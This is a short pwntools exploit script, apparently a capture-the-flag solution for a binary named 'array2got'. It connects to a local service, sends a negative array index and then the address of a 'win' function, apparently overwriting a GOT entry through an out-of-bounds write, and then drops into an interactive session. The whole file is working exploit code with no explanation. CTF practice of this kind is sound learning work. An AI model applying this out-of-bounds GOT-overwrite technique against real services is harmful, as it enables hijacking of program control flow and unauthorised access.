from pwn import *

context.arch = 'amd64'

io = remote('localhost', '8310')
# io = process('./array2got')

win = 0x401166

io.recvuntil(': ')
io.sendline('-8')

io.recvuntil(': ')
io.sendline(str(win))

io.interactive()
